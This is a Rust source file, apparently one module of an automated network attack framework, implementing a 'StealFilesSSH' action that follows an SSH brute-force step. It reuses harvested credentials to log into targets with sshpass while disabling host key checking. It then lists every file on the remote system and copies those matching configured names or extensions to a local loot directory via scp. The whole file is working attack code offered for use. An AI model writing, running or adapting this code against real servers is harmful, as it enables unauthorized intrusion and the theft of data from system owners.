use std::sync::Arc;
use std::time::Duration;

use russh::client;
use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal files from SSH servers using SFTP.
/// Parent: SSHBruteforce.
pub struct StealFilesSsh;

impl Action for StealFilesSsh {
    fn name(&self) -> &'static str {
        "StealFilesSSH"
    }
    fn port(&self) -> Option<u16> {
        Some(22)
    }
    fn parent(&self) -> Option<&'static str> {
        Some("SSHBruteforce")
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "ssh").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let config = state.config();
    let file_names = &config.steal_file_names;
    let file_exts = &config.steal_file_extensions;

    let local_dir = build_output_dir(state, "ssh", &target.mac_address, &target.ip);
    if let Err(e) = tokio::fs::create_dir_all(&local_dir).await {
        return ActionOutcome::Failed(e.to_string());
    }

    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(240), async {
            steal_via_ssh(
                &target.ip,
                user,
                password,
                file_names,
                file_exts,
                &local_dir,
            )
            .await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, user = %user, files = count, "files stolen via SSH");
                return ActionOutcome::Success;
            }
            Ok(Ok(_)) => {}
            Ok(Err(e)) => tracing::warn!(ip = %target.ip, %e, "SSH steal error"),
            Err(_) => tracing::warn!(ip = %target.ip, "SSH steal timed out"),
        }
    }

    ActionOutcome::Failed("no files stolen".to_string())
}

async fn steal_via_ssh(
    ip: &str,
    user: &str,
    password: &str,
    file_names: &[String],
    file_exts: &[String],
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    // Use ssh CLI + scp for simplicity and cross-compilation friendliness
    // Find matching files
    let find_output = tokio::process::Command::new("sshpass")
        .args([
            "-p",
            password,
            "ssh",
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "ConnectTimeout=10",
            &format!("{user}@{ip}"),
            "find / -type f 2>/dev/null",
        ])
        .output()
        .await
        .map_err(|e| e.to_string())?;

    let stdout = String::from_utf8_lossy(&find_output.stdout);
    let matching: Vec<&str> = stdout
        .lines()
        .filter(|f| {
            file_exts.iter().any(|ext| f.ends_with(ext.as_str()))
                || file_names.iter().any(|name| f.contains(name.as_str()))
        })
        .collect();

    if matching.is_empty() {
        return Ok(0);
    }

    let mut count = 0;
    for remote_file in &matching {
        // Determine local path preserving directory structure
        let rel_path = remote_file.trim_start_matches('/');
        let local_path = local_dir.join(rel_path);
        if let Some(parent) = local_path.parent() {
            let _ = tokio::fs::create_dir_all(parent).await;
        }

        let status = tokio::process::Command::new("sshpass")
            .args([
                "-p",
                password,
                "scp",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "ConnectTimeout=10",
                &format!("{user}@{ip}:{remote_file}"),
                local_path.to_str().unwrap_or_default(),
            ])
            .status()
            .await;

        if matches!(status, Ok(s) if s.success()) {
            count += 1;
        }
    }

    Ok(count)
}
